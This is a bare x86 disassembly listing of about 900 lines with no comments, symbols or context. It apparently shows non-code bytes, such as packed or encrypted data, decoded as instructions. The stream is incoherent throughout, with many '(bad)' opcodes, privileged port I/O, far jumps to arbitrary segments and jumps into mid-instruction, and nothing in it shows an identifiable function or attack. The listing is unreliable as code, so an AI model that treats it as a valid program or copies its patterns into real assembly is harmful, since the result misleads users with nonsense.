  41081c:	fsub   QWORD PTR [eax]
  41081e:	repz repnz in al,0xf5
  410822:	ss out dx,eax
  410824:	iret   
  410825:	clc    
  410826:	pop    ebx
  410827:	test   ch,al
  410829:	mov    ch,0x6b
  41082b:	inc    eax
  41082c:	mov    esp,DWORD PTR [edi]
  41082e:	sar    ch,1
  410830:	pushf  
  410831:	out    0xfd,eax
  410833:	or     BYTE PTR [ebp-0xc122183],ch
  410839:	shl    BYTE PTR [edx-0x57],1
  41083c:	push   0x1f
  41083e:	mov    ch,0xbf
  410840:	stos   DWORD PTR es:[edi],eax
  410841:	mov    ebx,0x7c94ad0a
  410846:	test   ch,ch
  410848:	out    0xdf,al
  41084a:	dec    esi
  41084b:	xor    DWORD PTR [esp+esi*2+0x61],eax
  41084f:	fstp   DWORD PTR [esi-0x1f2fc663]
  410855:	bound  ebx,QWORD PTR [edi+0xc]
  410858:	mov    ecx,0x2e80289e
  41085d:	cmp    al,0x72
  41085f:	stos   BYTE PTR es:[edi],al
  410860:	pop    ebx
  410861:	cs push edi
  410863:	aas    
  410864:	lahf   
  410865:	sbb    al,0xf1
  410867:	and    edi,DWORD PTR [eax]
  410869:	fmul   st(2),st
  41086b:	push   ebp
  41086c:	cmp    edx,ebp
  41086e:	mov    dl,0xd0
  410870:	mov    bl,0xd7
  410872:	mov    cl,BYTE PTR [eax]
  410874:	dec    esp
  410875:	mov    ds:0xc52a7ddd,eax
  41087a:	leave  
  41087b:	das    
  41087c:	sub    al,al
  41087e:	adc    dl,bh
  410880:	jns    0x41088f
  410882:	cmp    edx,ebx
  410884:	mov    esp,0x94ac9ca5
  410889:	add    bh,0x85
  41088c:	in     al,dx
  41088d:	mov    ds:0x97ba796d,al
  410892:	or     bh,ah
  410894:	ficom  DWORD PTR [eax]
  410896:	jb     0x41090c
  410898:	mov    al,0x36
  41089a:	out    dx,al
  41089b:	inc    esp
  41089d:	mov    bl,0x50
  41089f:	loop   0x41084c
  4108a1:	aad    0x27
  4108a3:	mov    edx,0x8f2ab8e4
  4108a8:	outs   dx,BYTE PTR ds:[esi]
  4108a9:	jl     0x4108a4
  4108ab:	jbe    0x410881
  4108ad:	mov    DWORD PTR [eax+0x61c94d26],eax
  4108b3:	mov    DWORD PTR [edi-0x691fb0aa],edx
  4108b9:	jg     0x4108c1
  4108bb:	and    BYTE PTR [ebp-0x25],dh
  4108be:	adc    eax,0x55d072d5
  4108c3:	out    0x27,eax
  4108c5:	leave  
  4108c6:	in     al,dx
  4108c7:	adc    ch,BYTE PTR [ebp+0x13]
  4108ca:	(bad)  
  4108cb:	cmc    
  4108cc:	xchg   edi,eax
  4108cd:	cmp    ebp,esp
  4108cf:	sti    
  4108d0:	pop    ds
  4108d1:	cdq    
  4108d2:	add    BYTE PTR [esi-0x2e],dh
  4108d5:	out    dx,eax
  4108d6:	jns    0x41088e
  4108d8:	push   0xd29d4e79
  4108dd:	mov    ah,0x2a
  4108df:	aas    
  4108e0:	cmp    al,0x5b
  4108e2:	clc    
  4108e3:	clc    
  4108e4:	hlt    
  4108e5:	test   ah,al
  4108e7:	test   DWORD PTR [edi-0x328524a8],eax
  4108ed:	adc    eax,0xca88f4ad
  4108f2:	xor    eax,0x7f60d11b
  4108f7:	pusha  
  4108f8:	jle    0x41094a
  4108fa:	rcr    cl,cl
  4108fc:	jge    0x410906
  4108fe:	push   ebx
  4108ff:	imul   ebx,DWORD PTR [edx],0x14
  410902:	in     al,dx
  410903:	push   ds
  410904:	jbe    0x41097a
  410906:	xchg   ecx,eax
  410907:	jbe    0x410912
  410909:	mov    ebx,0x34751521
  41090e:	dec    esp
  41090f:	adc    eax,0x978a353f
  410914:	and    al,BYTE PTR [edx+edi*1]
  410917:	data16 sbb al,BYTE PTR [ebx-0x73]
  41091b:	daa    
  41091c:	sbb    ah,BYTE PTR [edi]
  41091e:	sbb    eax,0x34b59855
  410923:	sub    al,0x75
  410925:	push   esi
  410926:	pop    edi
  410927:	test   eax,0x50c8b4d0
  41092c:	and    edi,0x72
  41092f:	sub    al,0x27
  410931:	sbb    DWORD PTR [edx-0x4f],ebx
  410934:	and    al,0xfd
  410936:	fild   WORD PTR ds:0x43e4d81a
  41093c:	dec    eax
  41093d:	inc    edi
  41093e:	and    BYTE PTR [edx-0x2a],dl
  410941:	jmp    0x708f8b15
  410946:	into   
  410947:	loop   0x41091c
  410949:	stos   DWORD PTR es:[edi],eax
  41094a:	sbb    eax,esi
  41094c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41094d:	iret   
  41094e:	and    al,0x75
  410950:	add    dl,al
  410952:	add    eax,0x23c92e79
  410957:	push   ecx
  410958:	call   0xe7ab:0xb43c131b
  41095f:	(bad)  [eax-0x1edd9486]
  410965:	xor    DWORD PTR [esi],edi
  410967:	(bad)  
  410968:	int3   
  410969:	mov    ss,WORD PTR [ebp-0x58]
  41096c:	lods   al,BYTE PTR ds:[esi]
  41096d:	repz xor DWORD PTR ds:0x1891dfcc,ecx
  410974:	fcomp  QWORD PTR [ebx+0x1df2b21]
  41097a:	mov    bl,0x71
  41097c:	jae    0x4109d0
  41097e:	add    al,0x16
  410980:	inc    ecx
  410981:	jl     0x41093b
  410983:	scas   al,BYTE PTR es:[edi]
  410984:	stc    
  410985:	mov    dl,0x29
  410987:	mov    cl,0xbe
  410989:	push   ebx
  41098a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41098b:	loop   0x410919
  41098d:	pop    ds
  41098e:	adc    eax,0x8ac9780e
  410993:	repnz sbb eax,DWORD PTR [ebx-0x50c9d449]
  41099a:	dec    ecx
  41099b:	out    0xb2,al
  41099d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41099e:	cmp    DWORD PTR [esi-0x74],0xfffffff8
  4109a2:	aad    0xa7
  4109a4:	ins    BYTE PTR es:[edi],dx
  4109a5:	or     dl,BYTE PTR [esp+ebp*4]
  4109a8:	lods   al,BYTE PTR ds:[esi]
  4109a9:	imul   eax,DWORD PTR [ebx-0x59],0x33
  4109ad:	jb     0x410963
  4109af:	sub    edi,DWORD PTR [ecx]
  4109b1:	or     edi,DWORD PTR [edx+0x61a22ddc]
  4109b7:	jae    0x4109bc
  4109b9:	rcl    DWORD PTR [ebp-0x60],0xad
  4109bd:	int    0xea
  4109bf:	fmul   st(6),st
  4109c1:	dec    DWORD PTR [ecx]
  4109c3:	inc    eax
  4109c4:	pop    edi
  4109c5:	inc    esp
  4109c6:	(bad)
  4109ca:	mov    ds:0x38843734,al
  4109cf:	sbb    DWORD PTR [ebx+0x3267fde2],eax
  4109d5:	ffreep st(6)
  4109d7:	loope  0x4109fb
  4109d9:	dec    esp
  4109da:	mov    eax,ds:0x18840e8d
  4109df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e0:	pop    esi
  4109e1:	imul   edx,DWORD PTR [ebx+0x6eb51705],0x5c25386e
  4109eb:	cmp    ebp,esp
  4109ed:	repz sub al,0x24
  4109f0:	mov    ds:0x578d696a,al
  4109f5:	bts    DWORD PTR [ebx-0x73],edi
  4109f9:	(bad)  
  4109fa:	mov    cl,0x42
  4109fc:	xor    BYTE PTR [ecx-0x32],cl
  4109ff:	xor    esi,DWORD PTR [eax]
  410a01:	mov    bl,0xd8
  410a03:	out    0x2d,eax
  410a05:	cmp    esi,DWORD PTR [edx]
  410a07:	ret    0x42f8
  410a0a:	cmp    edx,DWORD PTR [ebx+0x73]
  410a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a0e:	mov    ch,0xe0
  410a10:	or     eax,0x78a59898
  410a15:	mov    esp,0x9f5a993
  410a1a:	push   esi
  410a1b:	sub    eax,0xa12c45e7
  410a20:	mov    esi,0xf0c1cc48
  410a25:	icebp  
  410a26:	xchg   BYTE PTR [eax],dh
  410a28:	fdiv   QWORD PTR [ebx]
  410a2a:	ret    0x4b2f
  410a2d:	or     BYTE PTR [edi+eiz*1-0x40],0x2d
  410a32:	mov    al,0xd6
  410a34:	xchg   BYTE PTR [ebx-0x95225e1],ah
  410a3a:	(bad)  
  410a3b:	mov    ecx,0xa8664d0a
  410a40:	add    eax,0x5d84ea24
  410a45:	iret   
  410a46:	sbb    bl,dh
  410a48:	(bad)  
  410a49:	xchg   ebp,eax
  410a4a:	push   eax
  410a4b:	arpl   WORD PTR [esi+ecx*1],bp
  410a4e:	sbb    DWORD PTR [ecx-0x76],esp
  410a51:	gs adc al,0xff
  410a54:	pop    ds
  410a55:	mov    dh,0x80
  410a57:	fld    DWORD PTR [ecx]
  410a59:	and    ah,dh
  410a5b:	xor    DWORD PTR [edx+0x47],ecx
  410a5e:	repz jns 0x4109ff
  410a61:	mov    DWORD PTR [esi-0x1f5108a3],edx
  410a67:	outs   dx,BYTE PTR ds:[esi]
  410a68:	inc    edi
  410a69:	ds cdq 
  410a6b:	jle    0x410a46
  410a6d:	push   cs
  410a6e:	repz div BYTE PTR [edx+edx*8]
  410a72:	sub    bl,dl
  410a74:	daa    
  410a75:	push   ebp
  410a76:	fldz   
  410a78:	(bad)  
  410a79:	stos   DWORD PTR es:[edi],eax
  410a7a:	data16 pop bp
  410a7d:	mov    dl,0xa5
  410a7f:	xchg   DWORD PTR [edx+0x2ed3789b],esi
  410a85:	cli    
  410a86:	cli    
  410a87:	cmc    
  410a88:	icebp  
  410a89:	leave  
  410a8a:	daa    
  410a8b:	push   esp
  410a8c:	cs push edx
  410a8e:	pop    ss
  410a8f:	xchg   edx,eax
  410a90:	fdiv   DWORD PTR ds:0x3878e82a
  410a96:	and    dl,bh
  410a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a99:	int    0xd
  410a9b:	xor    al,0xd3
  410a9d:	fadd   DWORD PTR [ecx-0x618a90d0]
  410aa3:	or     dh,BYTE PTR ds:0x555cc01c
  410aa9:	jae    0x410a5e
  410aab:	add    eax,0x921754d5
  410ab0:	sbb    al,0x88
  410ab2:	inc    edi
  410ab3:	mov    ch,BYTE PTR [ecx-0x6d]
  410ab6:	pushf  
  410ab7:	add    al,0x82
  410ab9:	xor    BYTE PTR [edx-0x8e9fb89],bl
  410abf:	mov    esp,?
  410ac1:	xor    dh,BYTE PTR [edx]
  410ac3:	cdq    
  410ac4:	push   ebx
  410ac5:	mov    dl,0x8d
  410ac7:	mov    dh,0xf
  410ac9:	and    bh,BYTE PTR [ebx]
  410acb:	pop    esi
  410acc:	cmp    al,bh
  410ace:	ret    0x30b2
  410ad1:	arpl   WORD PTR [esi-0x30],bp
  410ad4:	or     esp,DWORD PTR [esi+0x27fd30b0]
  410ada:	test   eax,0x9b2c0e14
  410adf:	clc    
  410ae0:	sbb    DWORD PTR [edx+0xf],0x25be08b5
  410ae7:	mov    esp,0xf0724cf1
  410aec:	sbb    eax,0x2551b5f2
  410af1:	pusha  
  410af2:	sbb    al,0xd
  410af4:	inc    ebp
  410af5:	jmp    0xeb106af5
  410afa:	repnz adc al,0x56
  410afd:	mov    ds:0x2a141d32,al
  410b02:	lock cld 
  410b04:	(bad)  
  410b06:	fxch   st(1)
  410b08:	push   ecx
  410b09:	or     esp,edx
  410b0b:	(bad)  
  410b0c:	stos   DWORD PTR es:[edi],eax
  410b0d:	mov    esp,0xde78172b
  410b12:	sbb    BYTE PTR [edx],ch
  410b14:	in     al,dx
  410b15:	mov    ds:0x3b1128b3,eax
  410b1a:	dec    edx
  410b1b:	sbb    ch,ah
  410b1d:	sub    edi,DWORD PTR [eax+0x46a3e090]
  410b23:	loope  0x410b44
  410b25:	shr    edx,cl
  410b27:	push   ebx
  410b28:	call   0xea73dca6
  410b2d:	call   0x5d8a252b
  410b32:	cmp    DWORD PTR [ebx-0x5e],ebp
  410b35:	jmp    0x87a8:0x699551d5
  410b3c:	inc    eax
  410b3d:	xchg   DWORD PTR [eax],esp
  410b3f:	lahf   
  410b40:	aaa    
  410b41:	sub    ah,BYTE PTR [ebp+0x52]
  410b44:	pop    ecx
  410b45:	loopne 0x410b14
  410b47:	outs   dx,BYTE PTR ds:[esi]
  410b48:	mov    ?,WORD PTR [eax]
  410b4a:	push   ebx
  410b4b:	inc    ebx
  410b4c:	out    0xcd,eax
  410b4e:	pop    edi
  410b4f:	pop    ebp
  410b50:	into   
  410b51:	cmp    al,0x33
  410b53:	mov    bl,0x8c
  410b55:	or     dl,BYTE PTR [ecx-0x1d3026aa]
  410b5b:	mov    al,BYTE PTR [esi*4+0x617b4958]
  410b62:	scas   eax,DWORD PTR es:[edi]
  410b63:	rcl    DWORD PTR [edi+0x5e56108d],1
  410b69:	(bad)  
  410b6a:	mov    esp,0x46cbed10
  410b6f:	adc    eax,DWORD PTR [ebp-0x11]
  410b72:	ja     0x410b24
  410b74:	sbb    ch,bh
  410b76:	push   esp
  410b77:	ret    
  410b78:	stos   BYTE PTR es:[edi],al
  410b79:	ret    0x8eba
  410b7c:	mov    ah,0xc
  410b7e:	jb     0x410b23
  410b80:	pusha  
  410b81:	shl    DWORD PTR [edi],1
  410b83:	mov    dh,0x49
  410b85:	xor    bl,0x60
  410b88:	and    eax,0xee3fd5a5
  410b8d:	xor    BYTE PTR [esi+ebp*8],ch
  410b90:	push   es
  410b91:	add    eax,ecx
  410b93:	clc    
  410b94:	mov    ?,ebp
  410b96:	fadd   QWORD PTR [esi]
  410b98:	mov    bh,0x50
  410b9a:	push   0xc525c9c3
  410b9f:	neg    edx
  410ba1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410ba3:	xchg   edx,eax
  410ba4:	push   es
  410ba5:	add    ch,al
  410ba7:	dec    esi
  410ba8:	and    al,0xfb
  410baa:	jo     0x410bc5
  410bac:	fidiv  WORD PTR [edi]
  410bae:	lock leave 
  410bb0:	inc    eax
  410bb1:	dec    ebp
  410bb2:	jmp    0x410bf7
  410bb4:	rol    BYTE PTR [esi+ebp*1-0x7b07d7],0x39
  410bbc:	jmp    0xde151970
  410bc1:	jb     0x410bf2
  410bc3:	and    DWORD PTR [edx],edx
  410bc5:	daa    
  410bc6:	sub    bh,BYTE PTR [edi+0x12]
  410bc9:	clc    
  410bca:	or     al,0xed
  410bcc:	push   cs
  410bcd:	xor    edx,DWORD PTR ds:[eax-0x758fd572]
  410bd4:	dec    esp
  410bd5:	xor    al,0x2e
  410bd7:	dec    eax
  410bd8:	sbb    eax,esi
  410bda:	adc    DWORD PTR [ecx-0x1c],esi
  410bdd:	dec    eax
  410bde:	retf   0x1c9c
  410be1:	fst    QWORD PTR [ebp+0x7bb9c28a]
  410be7:	fist   DWORD PTR [ebx-0x15]
  410bea:	xchg   edi,eax
  410beb:	cs inc esp
  410bed:	jmp    0x410c6d
  410bef:	or     ebx,ecx
  410bf1:	push   esp
  410bf2:	sbb    eax,0xd2167c9a
  410bf7:	dec    edi
  410bf8:	sub    al,0xf8
  410bfa:	mov    WORD PTR [edi+0x4aaa368f],ss
  410c00:	xchg   ebx,eax
  410c01:	and    cl,al
  410c03:	ret    0xb798
  410c06:	lea    ecx,ds:0x1578c809
  410c0c:	jae    0x410c57
  410c0e:	sahf   
  410c0f:	ds pop ebp
  410c11:	sbb    eax,0xb2b5e1d8
  410c16:	mul    dl
  410c18:	pushf  
  410c19:	pop    ebp
  410c1a:	or     al,BYTE PTR [edx-0x311b4e7d]
  410c20:	cmp    edx,DWORD PTR [edi]
  410c22:	mov    BYTE PTR [edx+0x4d78e37f],ah
  410c28:	aas    
  410c29:	addr16 xor eax,0x87d8e04a
  410c2f:	xor    BYTE PTR [ecx],bl
  410c31:	sbb    al,0x7e
  410c33:	sbb    esi,DWORD PTR [edi+0x7e]
  410c36:	push   esi
  410c37:	test   eax,0x5af6f3cb
  410c3c:	sbb    BYTE PTR [ecx],bl
  410c3e:	xor    DWORD PTR [edi-0x7968cf6c],0x24a9dc3e
  410c48:	(bad)  
  410c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c4b:	aad    0x4b
  410c4d:	dec    ebx
  410c4e:	push   edx
  410c4f:	fidiv  DWORD PTR [esp+eax*2]
  410c52:	call   0xc51288a3
  410c57:	cmp    cl,0x6c
  410c5a:	mov    edx,0xf1e293aa
  410c5f:	bound  ecx,QWORD PTR [eax]
  410c61:	fistp  QWORD PTR [esi+0x6]
  410c64:	xlat   BYTE PTR ds:[ebx]
  410c65:	xor    al,0xfa
  410c67:	imul   esp,DWORD PTR [esi+0x59],0xb189c6a8
  410c6e:	rol    dh,0x39
  410c71:	scas   eax,DWORD PTR es:[edi]
  410c72:	cmp    bh,BYTE PTR [edi]
  410c74:	mov    ah,0x8b
  410c76:	and    cl,BYTE PTR [ebp+0x2a]
  410c79:	js     0x410cc1
  410c7b:	mov    eax,0x62272993
  410c80:	hlt    
  410c81:	loop   0x410c83
  410c83:	ret    
  410c84:	hlt    
  410c85:	mov    ch,0x13
  410c87:	jb     0x410c73
  410c89:	or     al,0xda
  410c8b:	push   es
  410c8c:	jp     0x410c76
  410c8e:	cdq    
  410c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c90:	sbb    ebp,DWORD PTR [ebp-0x6b89a7f6]
  410c96:	loope  0x410cad
  410c98:	sahf   
  410c99:	test   esp,edi
  410c9b:	push   ecx
  410c9c:	jb     0x410c97
  410c9e:	mov    ecx,0x4fecc10
  410ca3:	cmc    
  410ca4:	sbb    DWORD PTR [ecx],esp
  410ca6:	xchg   esp,eax
  410ca7:	clc    
  410ca8:	(bad)  
  410ca9:	cmp    al,0x60
  410cab:	(bad)  
  410cad:	rol    DWORD PTR [edx+0x58872819],0xdc
  410cb4:	jle    0x410d05
  410cb6:	es mov edx,ebx
  410cb9:	rcr    DWORD PTR [edi-0x5d],cl
  410cbc:	sbb    ch,BYTE PTR [ebp-0x29a4af7c]
  410cc2:	mov    dh,0xcf
  410cc4:	shl    DWORD PTR [edx-0x34f641c],cl
  410cca:	(bad)  
  410ccb:	call   0x6417cd8e
  410cd0:	xchg   ebp,eax
  410cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cd2:	mov    edi,0x5498ea42
  410cd7:	in     eax,0x89
  410cd9:	arpl   di,sp
  410cdb:	test   eax,0xa2e65bc6
  410ce0:	paddw  mm4,mm3
  410ce3:	je     0x410cc7
  410ce5:	test   eax,0x6a5c7a59
  410cea:	or     dh,dh
  410cec:	push   edx
  410ced:	mov    es,eax
  410cef:	fcmovnu st,st(4)
  410cf1:	and    DWORD PTR [ebp+ebp*1+0xb],eax
  410cf5:	(bad)  
  410cf6:	outs   dx,BYTE PTR ds:[esi]
  410cf7:	cmp    edx,DWORD PTR [edx+0x70]
  410cfa:	mov    edx,0xd0e8a646
  410d00:	jmp    0xf2515764
  410d05:	and    eax,0x6dfaded9
  410d0a:	inc    edi
  410d0b:	loope  0x410ca6
  410d0d:	sub    cl,BYTE PTR [eax-0x111ebcb2]
  410d13:	int    0x42
  410d15:	inc    eax
  410d16:	adc    al,0xb3
  410d18:	shr    BYTE PTR [esi],cl
  410d1a:	jns    0x410d83
  410d1c:	dec    ebp
  410d1d:	cs jno 0x410d73
  410d20:	arpl   WORD PTR [ecx-0x33],di
  410d23:	fst    QWORD PTR [eax+0x36ae79e7]
  410d29:	mov    ds:0x28434bf0,eax
  410d2e:	stc    
  410d2f:	push   0x44
  410d31:	sbb    ch,BYTE PTR [ebx]
  410d33:	sbb    DWORD PTR [eax+0x10],ecx
  410d36:	mov    ds:0x2b55837a,eax
  410d3b:	add    dl,BYTE PTR [edi-0x38]
  410d3e:	dec    eax
  410d3f:	add    ebx,DWORD PTR [eax]
  410d41:	push   ss
  410d42:	popf   
  410d43:	lods   eax,DWORD PTR ds:[esi]
  410d44:	icebp  
  410d45:	dec    ebp
  410d46:	cmp    BYTE PTR [ebx-0xded24f5],dl
  410d4c:	aad    0xeb
  410d4e:	idiv   BYTE PTR [esi]
  410d50:	xchg   edx,eax
  410d51:	pop    ecx
  410d52:	mov    cl,0x7
  410d54:	sbb    dl,BYTE PTR [esp+ebp*4]
  410d57:	cmp    edi,edx
  410d59:	nop
  410d5a:	jns    0x410d0f
  410d5c:	lahf   
  410d5d:	mov    cl,0xe
  410d5f:	iret   
  410d60:	leave  
  410d61:	call   0xf280:0xcd87fa40
  410d68:	push   edx
  410d69:	sahf   
  410d6a:	sub    esp,esi
  410d6c:	and    eax,0x4d85f2c
  410d71:	(bad)  
  410d72:	cmp    DWORD PTR [esi],esp
  410d74:	fisub  WORD PTR [ecx+0x4a1334d6]
  410d7a:	jl     0x410d7e
  410d7c:	push   ss
  410d7d:	push   ss
  410d7e:	push   ebp
  410d7f:	xchg   esi,eax
  410d80:	pop    ebx
  410d81:	sti    
  410d82:	xor    bh,BYTE PTR [ecx+eiz*2+0x1a]
  410d86:	div    BYTE PTR [ebp+0x213546ac]
  410d8c:	push   ss
  410d8d:	push   esp
  410d8e:	or     esp,DWORD PTR [edi-0x147e5155]
  410d94:	dec    esp
  410d95:	xchg   esp,eax
  410d96:	das    
  410d97:	jmp    0x410dfd
  410d99:	mov    esi,0x264fbd5e
  410d9e:	jp     0x410d5b
  410da0:	aad    0x18
  410da2:	pop    esp
  410da3:	or     ebp,DWORD PTR [esi+eax*1-0x9]
  410da7:	das    
  410da8:	daa    
  410da9:	shr    BYTE PTR [ebx-0xb],0xa0
  410dad:	mov    ch,0xd2
  410daf:	stos   DWORD PTR es:[edi],eax
  410db0:	dec    esp
  410db1:	sbb    eax,0xde30412c
  410db6:	xor    eax,0x8652f07b
  410dbb:	cmp    ecx,DWORD PTR [ebx]
  410dbd:	cmp    eax,0x13850eb9
  410dc2:	icebp  
  410dc3:	add    DWORD PTR [ecx],edi
  410dc5:	push   esi
  410dc6:	jmp    0x410de8
  410dc8:	jecxz  0x410d5c
  410dca:	ror    DWORD PTR [esi-0x64],cl
  410dcd:	mov    bl,0x9
  410dcf:	mov    al,0x5f
  410dd1:	mov    al,ds:0x80dcfd1
  410dd6:	scas   al,BYTE PTR es:[edi]
  410dd7:	sub    DWORD PTR [ecx+ebx*8],edi
  410dda:	jne    0x410d5e
  410ddc:	outs   dx,BYTE PTR ds:[esi]
  410ddd:	fsubr  DWORD PTR [ebp+0x59ceb621]
  410de3:	jmp    0xa944d028
  410de8:	sub    BYTE PTR [edx],ch
  410dea:	mov    cl,0x96
  410dec:	fistp  QWORD PTR [edx+0x24]
  410def:	lock bound esp,QWORD PTR [ebx-0x2b]
  410df3:	pop    ebx
  410df4:	adc    ebp,esi
  410df6:	addr16 sbb edi,esp
  410df9:	pop    edi
  410dfa:	dec    edi
  410dfb:	pop    edi
  410dfc:	sub    bl,BYTE PTR [edi-0x4f]
  410dff:	into   
  410e00:	mov    ah,0x2d
  410e02:	stc    
  410e03:	xor    eax,0xcf690ac0
  410e08:	(bad)  
  410e09:	xchg   edi,eax
  410e0a:	cwde   
  410e0b:	and    eax,0xcdbe8dc4
  410e10:	fwait
  410e11:	adc    DWORD PTR [edx-0x55],ebp
  410e14:	fidiv  WORD PTR [ecx+0x10]
  410e17:	ret    
  410e18:	cmp    eax,0xad2a0ad4
  410e1d:	add    al,0x8a
  410e1f:	test   al,0x71
  410e21:	and    bl,dl
  410e23:	retf   0x9735
  410e26:	push   ebx
  410e27:	mov    DWORD PTR [edi-0x7d],eax
  410e2a:	xchg   ebx,eax
  410e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e2c:	ins    BYTE PTR es:[edi],dx
  410e2d:	clc    
  410e2e:	jns    0x410e7c
  410e30:	test   eax,0xb20d453e
  410e35:	mov    edi,0xc512f1ef
  410e3a:	outs   dx,BYTE PTR ds:[esi]
  410e3b:	jge    0x410e07
  410e3d:	int    0x9e
  410e3f:	mov    DWORD PTR [edi+0x7c],0xe95a7f28
  410e46:	and    BYTE PTR [edx+ecx*8],bl
  410e49:	mul    ecx
  410e4b:	int3   
  410e4c:	xchg   ebx,eax
  410e4d:	loope  0x410e13
  410e4f:	test   BYTE PTR [esi+edi*4],ah
  410e52:	or     ah,dh
  410e54:	mov    gs,WORD PTR [edx+0x7da124e2]
  410e5a:	mov    ?,WORD PTR [edx-0x7a]
  410e5d:	cvtdq2ps xmm2,XMMWORD PTR [eax+0x513e8407]
  410e64:	sar    DWORD PTR [ecx],cl
  410e66:	xchg   edi,eax
  410e67:	add    al,0x7a
  410e69:	xor    BYTE PTR [esi],cl
  410e6b:	test   al,0xe6
  410e6d:	and    DWORD PTR [ebx],0xba104f00
  410e73:	pop    ebx
  410e74:	mov    WORD PTR ds:0x20ac0137,gs
  410e7a:	add    al,0xe
  410e7c:	out    dx,al
  410e7d:	pop    ebp
  410e7e:	dec    ebx
  410e7f:	mov    al,BYTE PTR [esp+eax*8-0x1e25ab6f]
  410e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e87:	repnz push 0x2b6327f6
  410e8d:	lock out dx,al
  410e8f:	sbb    ebp,0x2dd101c1
  410e95:	add    ecx,DWORD PTR [ebp+0x61b2f094]
  410e9b:	cdq    
  410e9c:	fsubr  st(2),st
  410e9e:	int    0x4b
  410ea0:	stos   DWORD PTR es:[edi],eax
  410ea1:	add    DWORD PTR [eax-0x319112f9],ebx
  410ea7:	dec    ecx
  410ea8:	call   0xd7788a5c
  410ead:	nop
  410eae:	push   cs
  410eaf:	mov    dh,0x74
  410eb1:	loop   0x410e66
  410eb3:	adc    dh,bh
  410eb5:	loopne 0x410ed3
  410eb7:	out    0xc1,eax
  410eb9:	fwait
  410eba:	mov    edx,0x8952a7fd
  410ebf:	inc    esp
  410ec0:	mov    edi,0xbfc1a23b
  410ec5:	je     0x410edd
  410ec7:	aas    
  410ec8:	stos   BYTE PTR es:[edi],al
  410ec9:	scas   al,BYTE PTR es:[edi]
  410eca:	das    
  410ecb:	(bad)  
  410ecc:	jae    0x410e5e
  410ece:	xchg   esi,eax
  410ecf:	pop    ecx
  410ed0:	inc    ebp
  410ed1:	ret    
  410ed2:	push   ebx
  410ed3:	out    dx,al
  410ed4:	cmc    
  410ed5:	(bad)  
  410ed6:	and    al,0xc7
  410ed8:	(bad)  
  410ed9:	pusha  
  410eda:	call   0xd1b3:0xd718299b
  410ee1:	or     al,0x47
  410ee3:	mov    cl,0xff
  410ee5:	pusha  
  410ee6:	pushf  
  410ee7:	test   al,0x3d
  410ee9:	pop    eax
  410eea:	into   
  410eeb:	xor    BYTE PTR [eax],bl
  410eed:	fcom   QWORD PTR [ebp-0x256296f5]
  410ef3:	xor    al,0xc3
  410ef5:	push   edx
  410ef6:	sti    
  410ef7:	lods   eax,DWORD PTR ds:[esi]
  410ef8:	push   edx
  410ef9:	push   ebx
  410efa:	nop
  410efb:	mov    si,gs
  410efe:	push   es
  410eff:	or     edi,DWORD PTR [edi+0x38979bfc]
  410f05:	jmp    0xa1ac:0xc5c6337f
  410f0c:	rol    BYTE PTR [ecx-0x32],1
  410f0f:	into   
  410f10:	call   0x1d0e:0x2a2ba2c4
  410f17:	push   ds
  410f18:	js     0x410f3a
  410f1a:	push   eax
  410f1b:	push   es
  410f1c:	xabort 0x95
  410f1f:	mov    WORD PTR [esi-0x5a],es
  410f22:	xor    al,BYTE PTR [eax]
  410f24:	mov    edi,0xb8ac86a2
  410f29:	pop    ds
  410f2a:	push   eax
  410f2b:	stc    
  410f2c:	rcr    eax,cl
  410f2e:	aaa    
  410f2f:	pop    esp
  410f30:	mov    ecx,0x5f6be98d
  410f35:	sti    
  410f36:	fucomp st(6)
  410f38:	pop    ss
  410f39:	sbb    al,0x77
  410f3b:	sahf   
  410f3c:	adc    ch,dh
  410f3e:	out    dx,eax
  410f3f:	mov    al,0xee
  410f41:	imul   ecx,DWORD PTR [ecx-0x3e68e149],0x42028539
  410f4b:	sbb    ch,BYTE PTR [edx+0x20]
  410f4e:	xchg   ebp,eax
  410f4f:	stos   DWORD PTR es:[edi],eax
  410f50:	sub    esi,DWORD PTR [ebx+0x64]
  410f53:	push   esp
  410f54:	dec    eax
  410f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f56:	dec    ecx
  410f57:	sbb    eax,0x3aa23d5e
  410f5c:	or     bl,BYTE PTR [ecx+esi*1]
  410f5f:	push   esp
  410f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f61:	push   edx
  410f62:	shl    al,0xcf
  410f65:	and    cl,bh
  410f67:	ja     0x410f04
  410f69:	push   cs
  410f6a:	add    BYTE PTR ds:0x483ffa5c,dh
  410f70:	call   0xfb87:0x452b71e7
  410f77:	and    cl,BYTE PTR [edi]
  410f79:	mov    dl,al
  410f7b:	fidiv  WORD PTR [edi-0x52]
  410f7e:	(bad)  
  410f7f:	out    0x34,al
  410f81:	mov    ecx,0x4359f649
  410f86:	jae    0x410f57
  410f88:	and    eax,0x4618137d
  410f8d:	stc    
  410f8e:	ficom  WORD PTR [ecx-0x13]
  410f91:	dec    ebx
  410f92:	jbe    0x410f68
  410f94:	sahf   
  410f95:	(bad)  
  410f96:	push   edi
  410f97:	stc    
  410f98:	call   0x3b0b0e72
  410f9d:	shl    DWORD PTR [edx+0x2a23405],1
  410fa3:	in     eax,0xaa
  410fa5:	jae    0x410f6f
  410fa7:	jmp    0x59d:0x1b882701
  410fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410faf:	imul   ebx,DWORD PTR [edi+0x3e44c357],0x7e
  410fb6:	dec    esi
  410fb7:	in     al,dx
  410fb8:	js     0x411013
  410fba:	clc    
  410fbb:	nop
  410fbc:	test   esp,eax
  410fbe:	push   edi
  410fbf:	or     cl,bl
  410fc1:	test   al,0x70
  410fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fc4:	in     al,dx
  410fc5:	aam    0x6a
